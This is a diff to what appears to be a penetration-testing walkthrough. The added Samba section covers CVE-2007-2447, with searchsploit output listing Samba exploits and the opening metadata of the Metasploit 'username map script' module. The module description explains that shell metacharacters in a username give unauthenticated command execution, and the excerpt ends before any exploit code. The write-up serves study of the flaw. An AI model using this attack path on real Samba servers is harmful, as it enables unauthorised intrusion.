@@ -180,4 +180,70 @@ class Metasploit3 < Msf::Exploit::Remote
 
 #### samba
 
-There is a well-known vulnerability in samba 
+There is a well-known CVE for samba in 2007 which is [2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447). Let's explore a bit more with searchsploit to understand it better.
+
+```bash
+searchsploit samba 2007
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+GoSamba 1.0.1 - 'INCLUDE_PATH' Multiple Remote File Inclusions                                                                                            | php/webapps/4575.txt
+Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                      | osx/remote/16875.rb
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                          | unix/remote/16320.rb
+Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                                        | linux/remote/9950.rb
+Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                    | linux/remote/16859.rb
+Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                  | solaris/remote/16329.rb
+Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                                                  | linux/dos/4732.c
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+```
+
+Based on the Google results of that CVE, I have found an entry on exploit-db.com - https://www.exploit-db.com/exploits/16320 which describes as "Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)". Let's delve in a bit more into the exploit. 
+
+```bash
+searchsploit -x 16320
+##
+# $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+        Rank = ExcellentRanking
+
+        include Msf::Exploit::Remote::SMB
+
+        # For our customized version of session_setup_ntlmv1
+        CONST = Rex::Proto::SMB::Constants
+        CRYPT = Rex::Proto::SMB::Crypt
+
+        def initialize(info = {})
+                super(update_info(info,
+                        'Name'           => 'Samba "username map script" Command Execution',
+                        'Description'    => %q{
+                                        This module exploits a command execution vulerability in Samba
+                                versions 3.0.20 through 3.0.25rc3 when using the non-default
+                                "username map script" configuration option. By specifying a username
+                                containing shell meta characters, attackers can execute arbitrary
+                                commands.
+
+                                No authentication is needed to exploit this vulnerability since
+                                this option is used to map usernames prior to authentication!
+                        },
+                        'Author'         => [ 'jduck' ],
+                        'License'        => MSF_LICENSE,
+                        'Version'        => '$Revision: 10040 $',
+                        'References'     =>
+                                [
+                                        [ 'CVE', '2007-2447' ],
+                                        [ 'OSVDB', '34700' ],
+
+```
